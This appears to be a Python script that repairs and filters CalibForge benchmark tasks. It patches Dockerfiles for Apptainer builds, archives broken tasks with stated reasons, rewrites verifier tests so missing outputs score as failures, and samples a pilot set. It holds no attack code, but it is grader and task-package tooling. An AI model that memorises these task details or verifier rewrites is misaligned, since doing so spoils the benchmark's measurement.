    "reason": "Temporarily archived at the user's request: the original upstream Dockerfile uses ubuntu:24.04 without installing Python, while tests/test.sh requires Python and pytest without provisioning them. No-op verification stops with 'no Python interpreter found' before any tests execute. The agent instructions ask for passphrase recovery and GPG decryption, not installation of Python or pytest. These are undocumented verifier prerequisites, not dependencies the instructions require the agent to supply. Our Dockerfile patches did not remove Python; a runtime using the image without injecting dependencies encounters the same mismatch. Original payload preserved for later repair.",
}

DROPPED['contrastive_solver-software-engineering_20260604_003113_010'] = {
    "category": "verifier-missing-python",
    "reason": "Temporarily archived at the user's request: the original upstream Dockerfile uses ubuntu:24.04 without installing Python, while tests/test.sh requires Python and pytest without provisioning them. No-op verification stops with 'no Python interpreter found' before any tests execute. The agent instructions ask for a C gzip decompressor using only libc, not installation of Python or pytest. These are undocumented verifier prerequisites, not dependencies the instructions require the agent to supply. Our Dockerfile patches did not remove Python; a runtime using the image without injecting dependencies encounters the same mismatch. Original payload preserved for later repair.",
}

DROPPED["multi_solver-software-engineering_20260414_211532_024"] = {
    "category": "verifier-task-memory-limit",
    "reason": "Temporarily archived at the user's request: no-op verification exceeded the task's configured 2 GiB memory limit in all four attempts. Slurm recorded OOM kills in job 1015176, steps 183, 201, 202 and 205 (stage-5 array 1015095_5). The verifier exercises the unchanged logger through threading and multiprocessing. This is not proof that an agent-corrected implementation is unsolvable; no memory-limit increase or grader weakening was applied.",
}


# ---- driver ------------------------------------------------------------------------------------

LABELS = (
    ("C1", "redundant-agent-resources-removed", "Remove ignored [agent] resource fields ({C1}) only after confirming identical values in [environment]; effective resource requests and agent timeout are unchanged."),
    ("B3", "verifier-preparation-comment-removed", "Remove the generated verifier-preparation comment; executable Dockerfile instructions are unchanged."),
    ("V3", "verifier-expected-unsolved-state-assertion", "{V3} Preserve the original behavioral checks, but report the expected unsolved state as failed tests with reward 0 instead of fixture setup errors. Explicitly authorized by the user."),
    ("V2", "verifier-missing-dependency-assertion", "Assert that {V2} is available to the verifier before loading dependent tests. Missing dependency fails a collected test with reward 0 instead of aborting collection; original tests are unchanged when available. Explicitly authorized by the user."),
    ("V1", "verifier-missing-output-assertion", "Assert that required agent output {V1} exists before loading dependent tests. Missing output fails a collected test instead of collection or fixture setup; existing-output checks are unchanged. Explicitly authorized by the user."),
    ("R1", "apptainer-build-compatibility", "Remove redundant image tags while preserving pinned digests for Apptainer."),
    ("R2", "apptainer-build-compatibility", "Preserve Docker WORKDIR semantics during Apptainer image builds."),
    ("R3", "explicit-command-paths", "Make command paths explicit after directory changes."),
    ("R4", "apptainer-build-compatibility", "Copy build-only inputs to a staging directory instead of /tmp, which "
                                            "Apptainer hides from RUN steps, and remove it after use."),
    ("R5", "apptainer-build-compatibility", "Write ENV values that reference a variable with the value Docker "
                                            "substitutes, because the Apptainer builder exports them unexpanded."),
    ("R6", "empty-directory-restored", "Create {R6} with mkdir instead of COPY: the directory is empty in the published "
                                       "upstream image and empty directories are absent from the release."),
    ("R7", "upstream-image-base", "Build FROM the task's published upstream image {R7}, because a task input "
                                  "it contains is absent from the release."),
    ("R8", "apptainer-build-compatibility", "Name each file a COPY wildcard matches, because the Apptainer builder "
                                            "does not expand wildcards."),
    ("R9", "copy-order-restored", "Apply {R9} COPY source(s) into system directories at their Dockerfile position, "
                                  "after the preceding RUN steps, through a staging directory removed at the end: "
                                  "the Apptainer builder otherwise copies them before packages are installed and "
                                  "dpkg stops at a configuration file prompt."),
    ("R10", "apptainer-build-compatibility", "Remove comment and blank lines inside continued instructions as "
                                             "Docker's parser does; the Apptainer builder joins them into the command."),
    ("R11", "apptainer-build-compatibility", "Install uv {R11} from its release archive with a pinned SHA-256 "
                                             "instead of COPY --from the uv image, which the builder lacks."),
    ("R12", "apptainer-build-compatibility", "Run RUN commands that sequence commands with `;` without errexit, "
                                             "as Docker does; the shared builder runs each RUN under `sh -e`."),
    ("R13", "apptainer-build-compatibility", "Copy a directory whose entry names contain whitespace through its "
                                             "parent directory and a staging directory removed at the end."),
    ("R14", "apptainer-build-compatibility", "Give the RUN steps an image-local /tmp and /var/tmp holding the "
                                             "build inputs copied there, removed at the end; Apptainer otherwise "
                                             "mounts the build host's directories over them."),
    ("R15", "upstream-image-base", "Build FROM the task's published upstream image {R15}: the Dockerfile copies "
                                   "files from a separate build stage, which the Apptainer builder does not support."),
    ("R16", "apptainer-build-compatibility", "Pass the body of a RUN heredoc to its command through printf; the "
                                             "Apptainer builder drops heredoc bodies, so the command ran on empty input."),
    ("R17", "apptainer-build-compatibility", "Let the build script continue when it cannot raise the core file "
                                             "limit, which build steps on the compute nodes may not do; its "
                                             "dump is written by gcore, which does not use the limit."),
    ("R18", "apt-tool-version-pins-removed", "Remove the reviewed build-essential, gdb and valgrind apt version pins "
                                           "({R18}); the sensor-log debugging task does not require those exact tool versions. "
                                           "Preserve the package list, install flags, source files and verifier."),
    ("A", "shared-image", "Use the comment-free equivalent Dockerfile of task {A} so identical environments "
                          "share one cached image."),
    ("B1", "verifier-dependencies-in-image", "Install the verifier's test runner and tools at image build time "
                                             "instead of at each verification."),
    ("B2", "verifier-setup-separation", "Move verifier installation commands from tests/test.sh to tests/setup.sh "
                                        "unchanged so setup is timed separately; checks and reward logic are unchanged."),
)
RULES = [rule for rule, _, _ in LABELS]


# Explicitly authorized verifier adjustment: missing agent output is a failed test.
REQUIRED_SOLUTION_FILES = {
    "contrastive_solver-security_20260604_003113_006": "/app/base64_decoder.py",
    'contrastive_solver-software-engineering_20260528_174918_024': '/app/server.py',
    'contrastive_solver-software-engineering_20260603_181444_011': '/app/table_format.py',
    'contrastive_solver-data-science_20260604_002443_006': '/app/pipeline.py',
    'contrastive_solver-software-engineering_20260613_152233_017': '/app/calc/calc.c',
    'contrastive_solver-data-science_20260614_141608_006': '/app/csv2parquet.py',
    'contrastive_solver-data-science_20260601_053159_006': '/app/consolidate.py',
    'contrastive_solver-software-engineering_20260606_172622_024': '/app/gc.c',
    'contrastive_solver-software-engineering_20260604_002443_024': '/app/regex_engine.py',
    "contrastive_solver-data-science_20260610_112157_008": "/app/fit_seir.py",
}


def _indent_verifier(text):
    """Indent Python control flow without changing multiline string contents."""
    import io
    import tokenize
    interiors = set()
    for token in tokenize.generate_tokens(io.StringIO(text).readline):
        if token.type == tokenize.STRING:
            interiors.update(range(token.start[0] + 1, token.end[0] + 1))
    return ''.join(line if number in interiors else '    ' + line
                   for number, line in enumerate(text.splitlines(keepends=True), 1))


def assert_required_solution_file(task_id, text):
    path = REQUIRED_SOLUTION_FILES.get(task_id)
    marker = "# CalibForge: assert missing agent output before loading dependent tests."
    if path is None or text.startswith(marker):
        return text
    return (marker + "\nfrom pathlib import Path as _RequiredSolutionPath\n"
            + f"if not _RequiredSolutionPath({path!r}).is_file():\n"
            + "    def test_required_solution_file_exists():\n"
            + f"        assert _RequiredSolutionPath({path!r}).is_file(), {('Required agent output is missing: ' + path)!r}\n"
            + "else:\n" + _indent_verifier(text))


REQUIRED_VERIFIER_MODULES = {
    "contrastive_solver-data-processing_20260604_003814_003": "pandas",
}


def assert_required_verifier_module(task_id, text):
    module = REQUIRED_VERIFIER_MODULES.get(task_id)
    marker = "# CalibForge: assert missing verifier dependency before loading tests."
    if module is None or text.startswith(marker):
        return text
    return (marker + "\nfrom importlib.util import find_spec as _verifier_find_spec\n"
            + f"if _verifier_find_spec({module!r}) is None:\n"
            + "    def test_required_verifier_dependency():\n"
            + f"        assert _verifier_find_spec({module!r}) is not None, {('Required verifier dependency is missing: ' + module)!r}\n"
            + "else:\n" + _indent_verifier(text))


SERVICE_VERIFIER_REPAIRS = {
    "contrastive_solver-system-administration_20260610_111702_004": "The agent must recover and start PostgreSQL; absence of a usable connection is an expected unsolved state.",
    "contrastive_solver-software-engineering_20260604_002443_020": "The agent must repair the Go/cgo build and start the service; failed compilation or service startup is an expected unsolved state.",
}


def assert_requested_service(task_id, text):
    """Move expected unsolved-state failures into test calls, retaining real checks."""
    import ast
    marker = "# CalibForge: report expected unsolved service state in test assertions."
    if task_id not in SERVICE_VERIFIER_REPAIRS or text.startswith(marker):
        return text
    if task_id == "contrastive_solver-system-administration_20260610_111702_004":
        old = '    pytest.fail("Could not connect to any PostgreSQL instance. "\n                "Is the server running?")'
        if text.count(old) != 1:
            raise ValueError(f"{task_id}: PostgreSQL failure guard changed")
        text = text.replace(old, '    return None  # Expected until the agent recovers and starts PostgreSQL.')
        assertion = 'assert pg_connection is not None, "Required recovered PostgreSQL service is not running"'
    else:
        old = '    assert result.returncode == 0, (\n        f"Go build failed.\\nSTDOUT: {result.stdout}\\nSTDERR: {result.stderr}"\n    )'
        if text.count(old) != 1 or text.count('def setup_module():') != 1:
            raise ValueError(f"{task_id}: Go build setup changed")
        text = text.replace('def setup_module():', 'from functools import lru_cache as _cache_service_preparation\n\n@_cache_service_preparation(maxsize=1)\ndef _prepare_requested_service():')
        text = text.replace(old, '    if result.returncode != 0:\n        return f"Go build failed.\\nSTDOUT: {result.stdout}\\nSTDERR: {result.stderr}"')
        old = '        raise RuntimeError("Server failed to start within 15 seconds")'
        if text.count(old) != 1:
            raise ValueError(f"{task_id}: Go startup failure changed")
        text = text.replace(old, '        return "Server failed to start within 15 seconds"')
        assertion = '_service_error = _prepare_requested_service()\nassert _service_error is None, _service_error'
    lines = text.splitlines(keepends=True)
    tests = [node for node in ast.parse(text).body if isinstance(node, ast.FunctionDef) and node.name.startswith('test_')]
    if not tests:
        raise ValueError(f"{task_id}: no tests found")
    for node in reversed(tests):
        if 'PostgreSQL' in SERVICE_VERIFIER_REPAIRS[task_id] and not any(a.arg == 'pg_connection' for a in node.args.args):
            raise ValueError(f"{task_id}: expected every test to use pg_connection")
        first = node.body[0]
        index = first.end_lineno if isinstance(first, ast.Expr) and isinstance(first.value, ast.Constant) and isinstance(first.value.value, str) else first.lineno - 1
        lines.insert(index, ''.join('    ' + line + '\n' for line in assertion.splitlines()))
    return marker + "\n" + ''.join(lines)


def patch_task(task_id, binary, shared=None):
    members = read_task(binary)
    names = {info.name: k for k, (info, _) in enumerate(members)}
    changes = {}
    plan = None
    if "tests/test.sh" in names and "tests/setup.sh" not in names:
        text = members[names["tests/test.sh"]][1].decode("utf-8")
        plan = plan_verifier(text)
        if plan["unpinned"]:
            changes["unpinned_uvx_requirements"] = plan["unpinned"]
        if plan["agent_visible"]:
            changes["verifier_packages_in_image"] = plan["agent_visible"]
        # Downloads that still happen in test.sh: installation commands outside a clean leading block,
        # or a uvx call whose tool environment is not in the image.
        remaining = plan["test"] or text
        warmed = bool(plan["layer"]) and " pytest --version" in plan["layer"]
        if (plan["kind"] != "guarded" and NETWORK_INSTALL.search(remaining)) or (
                re.search(r"\buvx\b", remaining) and not warmed):
            changes["verifier_network_use_in_test_sh"] = plan["kind"] or "unsplit"
    # Inputs of R4: directories of the build context and every text that could name a copied file.
    directories = set()
    for info, _ in members:
        path = posixpath.relpath(info.name.rstrip("/"), "environment")
        if info.name.startswith("environment/") and path != ".":
            path = path if info.isdir() else posixpath.dirname(path)
            while path:
                directories.add(path)
                path = posixpath.dirname(path)
    other_texts = [data.decode("utf-8", "replace") for info, data in members
                   if data is not None and info.name != "environment/Dockerfile"]
    context = {posixpath.relpath(info.name.rstrip("/"), "environment") for info, _ in members
               if info.name.startswith("environment/")}
    for k, (info, data) in enumerate(members):
        if info.name == "environment/Dockerfile":
            text = data.decode("utf-8")
            new = text
            if shared and shared[1] != text:
                new = shared[1]
                changes["A"] = shared[0]
            if VERIFIER_PREPARATION_COMMENT in new.splitlines():
                new = ''.join(line for line in new.splitlines(keepends=True)
                              if line.rstrip('\r\n') != VERIFIER_PREPARATION_COMMENT)
                changes["B3"] = True
            new, pins = unpin_reviewed_apt_tools(task_id, new)
            if pins:
                changes["R18"] = ", ".join(pins)
            new, count, reason = inline_heredocs(new)
            if count:
                changes["R16"] = count
            if reason:
                changes["heredoc_unresolved"] = reason
            new, count = strip_continuation_comments(new)
            if count:
                changes["R10"] = count
            new, versions = replace_uv_image_copies(task_id, new)
            if versions:
                changes["R11"] = ", ".join(versions)
            if task_id in EMPTY_DIRECTORY_COPIES:
                new, changes["R6"] = restore_empty_directory(task_id, new, context)
            elif task_id in UPSTREAM_IMAGE_TASKS:
                new, changes["R7"] = upstream_image_dockerfile(task_id, new, context)
            elif task_id in BUILD_STAGE_TASKS:
                new, changes["R15"] = build_stage_dockerfile(task_id, new)
            new, count, reason = stage_unsafe_directory_copies(new, context)
            if count:
                changes["R13"] = count
            if reason:
                changes["copy_names_unresolved"] = reason
            missing = missing_copy_sources(new, context)
            if missing:
                changes["copy_source_missing"] = missing
            new, count, reason = expand_copy_globs(new, context)
            if count:
                changes["R8"] = count
            if reason:
                changes["copy_glob_unresolved"] = reason
            new, count, reason = resolve_env_references(new)
            if count:
                changes["R5"] = count
            if reason:
                changes["env_reference_unresolved"] = reason
            rewritten, staged, reason = stage_tmp_copies(new, directories, other_texts)
            private = False
            if reason or unrewritten_tmp_use(rewritten, staged):
                # R4 cannot rewrite every use; keep the paths and give the RUN steps a private /tmp.
                moved, count, why = private_tmp_copies(new)
                if count and TMP_USE.search("\n".join(RUN_LINE.match(logical)["cmd"] for logical in run_steps(new))):
                    new, private, changes["R14"] = moved, True, count
                elif reason:
                    changes["tmp_copy_unresolved"] = why or reason
                else:
                    new, changes["R4"] = rewritten, staged
            elif staged:
                new, changes["R4"] = rewritten, staged
            new, count, reason = restore_copy_order(new, directories)
            if count:
                changes["R9"] = count
            if reason:
                changes["copy_order_unresolved"] = reason
            new, details = patch_dockerfile(task_id, new)
            if details["heredoc_run_skipped"]:
                changes["heredoc_run_skipped"] = details["heredoc_run_skipped"]
            if details["R1"]:
                changes["R1"] = details["R1"]
            if details["R2"]:
                changes["R2"] = details["R2"]
            if details["R12"]:
                changes["R12"] = details["R12"]
            if private:
                new = wrap_private_tmp(new)
            if plan and plan["layer"]:
                if new.rstrip().endswith("\\"):
                    raise ValueError(f"{task_id}: Dockerfile ends inside a continued instruction")
                layer = plan["layer"]
                if task_id in NO_CA_BUNDLE:
                    layer = layer.split(UV_ENV_STEP)[0].rstrip("; ") + "\n"
                    changes["verifier_warmup_skipped"] = NO_CA_BUNDLE[task_id]
                elif re.search(r"^ENV\s+PATH=.*/root/\.local/bin", new, re.M):
                    # With the directory already on PATH the uv installer writes no env file to source.
                    layer = layer.replace(UV_ENV_STEP, 'export PATH="$HOME/.local/bin:$PATH" && ')
                new = new.rstrip("\n") + "\n\n" + layer
                changes["B1"] = plan["kind"]
            members[k] = (info, new.encode("utf-8"))
        elif info.name == "task.toml":
            new, removed = remove_redundant_agent_resources(task_id, data.decode('utf-8'))
            if removed:
                members[k] = (info, new.encode('utf-8'))
                changes['C1'] = ', '.join(removed)
        elif CORE_LIMIT_SCRIPTS.get(task_id) == info.name:
            new, count = tolerate_core_limit(data.decode("utf-8"))
            if count != 1:
                raise ValueError(f"{task_id}: {info.name} does not set the core file limit exactly once")
            members[k] = (info, new.encode("utf-8"))
            changes["R17"] = count
        elif info.name == "tests/test_outputs.py" and task_id in REQUIRED_SOLUTION_FILES:
            text = data.decode("utf-8")
            new = assert_required_solution_file(task_id, text)
            if new != text:
                members[k] = (info, new.encode("utf-8"))
                changes["V1"] = REQUIRED_SOLUTION_FILES[task_id]
        elif info.name == "tests/test_outputs.py" and task_id in REQUIRED_VERIFIER_MODULES:
            text = data.decode("utf-8")
            new = assert_required_verifier_module(task_id, text)
            if new != text:
                members[k] = (info, new.encode("utf-8"))
                changes["V2"] = REQUIRED_VERIFIER_MODULES[task_id]
        elif info.name == "tests/test_outputs.py" and task_id in SERVICE_VERIFIER_REPAIRS:
            text = data.decode("utf-8")
            new = assert_requested_service(task_id, text)
            if new != text:
                members[k] = (info, new.encode("utf-8"))
                changes["V3"] = SERVICE_VERIFIER_REPAIRS[task_id]
        elif info.name == "instruction.md":
            text = data.decode("utf-8")
            new, count = patch_instruction(text)
            if new != text:
                members[k] = (info, new.encode("utf-8"))
                changes["R3"] = count
    if plan and plan["setup"]:
        if "B1" not in changes:
            raise ValueError(f"{task_id}: verifier setup was split without an image layer")
        k = names["tests/test.sh"]
        info = members[k][0]
        setup = tarfile.TarInfo("tests/setup.sh")
        setup.mode, setup.mtime, setup.uid, setup.gid = info.mode, info.mtime, info.uid, info.gid
        setup.uname, setup.gname = info.uname, info.gname
        members[k] = (info, plan["test"].encode("utf-8"))
        members.insert(k + 1, (setup, plan["setup"].encode("utf-8")))
        changes["B2"] = True
    modified = set(RULES) & changes.keys()
    return (write_task(members) if modified else binary), changes, bool(modified)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--source", type=Path, required=True)
    parser.add_argument("--output", type=Path, required=True)
    args = parser.parse_args()
    source = args.source.resolve()
    files = [source] if source.is_file() else sorted(source.glob("*.parquet"))
    if not files or any(f.suffix != ".parquet" for f in files):
        raise ValueError(f"no pinned CalibForge Parquet files in {source}")
    args.output.mkdir(parents=True, exist_ok=True)
    manifest = {"source_revision": REVISION, "tasks": [], "dropped": DROPPED,
                "counts": {**dict.fromkeys(RULES, 0), "changed": 0, "dropped": 0, "total": 0}}
    for path in files:
        target = args.output / path.name
        temporary = target.with_suffix(".parquet.tmp")
        reader = pq.ParquetFile(path)
        shared = plan_shared_dockerfiles([path])
        with pq.ParquetWriter(temporary, reader.schema_arrow, compression="zstd") as writer:
            for batch in reader.iter_batches(batch_size=64):
                table = batch.to_pydict()
                kept = [i for i, task_id in enumerate(table["path"]) if task_id not in DROPPED]
                manifest["counts"]["total"] += len(table["path"])
                manifest["counts"]["dropped"] += len(table["path"]) - len(kept)
                table = {name: [column[i] for i in kept] for name, column in table.items()}
                for i, task_id in enumerate(table["path"]):
                    binary, changes, modified = patch_task(task_id, table["task_binary"][i], shared.get(task_id))
                    if changes:
                        manifest["tasks"].append({"task": task_id, "changes": changes})
                    if modified:
                        table["task_binary"][i] = binary
                        manifest["counts"]["changed"] += 1
                        for rule in RULES:
                            manifest["counts"][rule] += rule in changes
                writer.write_table(pa.table(table, schema=reader.schema_arrow))
        temporary.replace(target)
        from data.utils.patch_reporting import write_patch_report
        changed = [item for item in manifest["tasks"] if set(RULES) & item["changes"].keys()]
        write_patch_report(path, target,
            source={"dataset": "AweAI-Team/CalibForge", "url": "https://huggingface.co/datasets/AweAI-Team/CalibForge", "revision": REVISION},
            dropped=DROPPED, patcher=__file__,
            change_labels={item["task"]: sorted({label for rule, label, _ in LABELS if rule in item["changes"]})
                           for item in changed},
            change_reasons={item["task"]: " ".join(message.format(**item["changes"]) for rule, _, message in LABELS
                                                   if rule in item["changes"]) for item in changed})
    for key in ("heredoc_unresolved", "copy_names_unresolved", "verifier_warmup_skipped", "copy_source_missing", "copy_glob_unresolved", "copy_order_unresolved", "env_reference_unresolved", "tmp_copy_unresolved", "heredoc_run_skipped", "unpinned_uvx_requirements", "verifier_packages_in_image",
                "verifier_network_use_in_test_sh"):
        manifest["counts"][key] = sum(key in item["changes"] for item in manifest["tasks"])
    (args.output / "calibforge_repair_manifest.json").write_text(json.dumps(manifest, indent=1) + "\n")


# Prepare pilot
"""Prepare a deterministic ten-task CalibForge sample for the shared validation pipeline."""
import argparse
from datetime import datetime, timezone
import hashlib
import json
from pathlib import Path
import random
import shutil

prepare_pilot_REVISION = 'fb1e75441a94b8bb0ced08acd6b59e711704d70a'
SOURCE = 'AweAI-Team/CalibForge'
CATEGORIES = ['software-engineering', 'system-administration', 'scientific-computing',
              'security', 'data-science', 'file-operations', 'debugging',
              'data-processing', 'mathematics', 'data-querying']


def prepare_pilot_main():
    ap = argparse.ArgumentParser(description='Prepare a deterministic ten-task CalibForge sample for the shared validation pipeline.')
    ap.add_argument('--base', type=Path, required=True)
    ap.add_argument('--source', type=Path, help='original task tree; defaults to upstream/repo')
    ap.add_argument('--input', type=Path, help='explicit patched ten-task directory for reruns')
    options = ap.parse_args()
    base = options.base.resolve()
    upstream = base / 'upstream'
    source = (options.source or upstream / 'repo').resolve()
    repository = json.loads((upstream / 'repository.json').read_text())
    if repository['sha'] != prepare_pilot_REVISION:
        raise ValueError('Unexpected source revision')
    rows = [json.loads(s) for s in (upstream / 'metadata.jsonl').read_text().splitlines()]
    rng = random.Random(42)
    selected = []
    for i, category in enumerate(CATEGORIES):
        subset = 'multi_solver' if i % 2 else 'contrastive_solver'
        candidates = sorted((r for r in rows if r['category'] == category and r['subset'] == subset),
                            key=lambda r: r['task_id'])
        selected.append(rng.choice(candidates))
    run = base / 'runs' / datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%S%fZ')
    run.mkdir(parents=True)
    tasks = run / 'input/tasks'
    tasks.mkdir(parents=True)
    records = []
    for row in selected:
        src = options.input / row['task_id'] if options.input else source / row['task_path']
        dest = tasks / row['task_id']
        shutil.copytree(src, dest)
        hashes = {}
        for file in sorted(dest.rglob('*')):
            if not file.is_file():
                continue
            content = file.read_bytes()
            if content.startswith(b'version https://git-lfs.github.com/spec/v1\n'):
                raise ValueError(f'Unfetched LFS object: {file}')
            hashes[str(file.relative_to(dest))] = hashlib.sha256(content).hexdigest()
        records.append({**row, 'files_sha256': hashes,
                        'has_oracle': (dest / 'solution/solve.sh').is_file()})
    manifest = {'source': SOURCE, 'revision': prepare_pilot_REVISION, 'seed': 42,
                'method': 'one random task per listed CPU-oriented category; alternating subsets; no outcome filtering',
                'categories': CATEGORIES, 'tasks': records, 'source_tree': str(source),
                'patched_input': str(options.input) if options.input else None}
    (run / 'selection.json').write_text(json.dumps(manifest, indent=2) + '\n')
    print(f'Prepared tasks: {tasks}')


def prepare_pilot_cli():
    prepare_pilot_main()


def prepare_runtime(files, image, probe, binding, bundle, catalog):
    """Protect a measured published verifier while preserving task initialization."""
    from data.calibforge import verifier_runtime
    planned = verifier_runtime.plan(files, image, probe, binding, bundle)
    return verifier_runtime.apply(files, planned, catalog), planned


def runtime_cli():
    """Migrate only measured published verifier families, preserving task setup."""
    ap = argparse.ArgumentParser(description='Prepare reviewed published CalibForge verifier runtimes')
    ap.add_argument('--published-input',type=Path,required=True)
    ap.add_argument('--published-revision',required=True)
    ap.add_argument('--published-subset',choices=['calibforge_v1','calibforge_v2','calibforge_v3'],required=True)
    ap.add_argument('--runtime-image-inventory',type=Path,required=True)
    ap.add_argument('--runtime-probe',type=Path,required=True)
    ap.add_argument('--runtime-cache',type=Path,required=True)
    ap.add_argument('--output',type=Path,required=True)
    args=ap.parse_args()
    from data.calibforge.verifier_runtime import migrate_published
    report=migrate_published(args.published_input,args.output,revision=args.published_revision,
        subset=args.published_subset,image=json.loads(args.runtime_image_inventory.read_text()),
        probe=json.loads(args.runtime_probe.read_text()),cache=args.runtime_cache)
    print(json.dumps(report['counts'],indent=2))


if __name__ == "__main__":
    from data.utils.cli import dispatch
    dispatch({'prepare-pilot': prepare_pilot_cli, 'prepare-runtime': runtime_cli})
    main()
